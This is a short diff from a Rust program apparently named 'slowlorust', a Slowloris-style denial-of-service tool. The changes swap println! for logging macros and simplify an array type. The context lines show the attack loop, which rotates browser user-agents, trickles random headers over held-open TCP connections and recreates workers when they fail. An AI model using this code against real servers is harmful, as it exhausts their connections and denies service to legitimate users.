@@ -5,7 +5,7 @@ use std::net::TcpStream;
 use std::thread;
 use std::time::Duration;
 
-const USER_AGENTS: [&'static str; 10] = [
+const USER_AGENTS: [&str; 10] = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
     "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
@@ -57,13 +57,13 @@ impl Worker {
             ));
             match &self.stream.write_all(format!("X-a: {}\r\n", &self.rng.gen::<u64>()).as_bytes()) {
                 Ok(_) if (self.verbose > 0) => {
-                    println!("[slowlorust_{:03}] Data send success.", self.id)
+                    info!("[slowlorust_{:03}] Data send success.", self.id)
                 }
                 Ok(_) => {}
                 Err(_) => {
                     if let Ok(worker) = Worker::new(self.id, self.conn.clone(), self.sleep_bounds, self.verbose) {
                         if self.verbose > 0 {
-                            println!("[slowlorust_{:03}] Recreating.", self.id);
+                            warn!("[slowlorust_{:03}] Recreating.", self.id);
                         }
                         *self = worker;
                         // Avoid nested loops
